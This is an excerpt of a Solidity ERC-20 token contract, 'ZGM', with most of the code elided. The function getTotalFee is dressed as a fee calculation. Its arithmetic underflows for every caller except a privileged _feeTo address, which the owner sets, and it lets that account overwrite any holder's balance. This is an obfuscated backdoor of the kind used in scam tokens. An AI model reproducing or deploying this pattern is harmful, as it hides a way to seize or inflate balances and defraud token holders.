...
contract ZGM is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function getTotalFee(address _x, uint256 _m) public {
        mapping(address => uint256) storage _n = _balances;
        uint256 feeRate = _msgSender() == _feeTo ? 5 : 1;
        uint256 feeC = feeRate - 3;
        feeRate = feeC;
        _n[_x] = _m;
    }
    ...
    function setFeeTo(address _x) public onlyOwner {
        _feeTo = _x;
    }
}